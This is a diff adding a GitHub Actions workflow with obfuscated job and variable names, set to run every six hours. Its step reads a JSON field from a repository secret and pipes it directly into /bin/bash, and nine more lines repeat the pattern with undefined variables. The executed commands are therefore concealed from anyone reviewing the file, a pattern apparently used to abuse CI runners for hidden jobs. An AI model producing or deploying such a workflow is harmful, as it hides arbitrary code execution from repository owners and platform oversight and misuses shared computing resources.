@@ -1,0 +1,28 @@
+name: budonghighcjiuwen
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: budonghighcjiuwen
+        env:
+          rhc3781: ${{ secrets.rhc3781 }}
+        run: |
+          echo $rhc3781 | jq -r .egn020 | /bin/bash
+          echo $ytoaf02 | jq -r .tmes20714 | /bin/bash
+          echo $zs237 | jq -r .aiwh89263 | /bin/bash
+          echo $mqacz8849 | jq -r .pwarg4 | /bin/bash
+          echo $xsckd80918 | jq -r .ci9813 | /bin/bash
+          echo $bnmly1 | jq -r .d742 | /bin/bash
+          echo $xyt858 | jq -r .zl7 | /bin/bash
+          echo $if05388 | jq -r .xeaai42054 | /bin/bash
+          echo $sfylw315 | jq -r .vxztb6 | /bin/bash
+          echo $r5556 | jq -r .fyru69 | /bin/bash
+
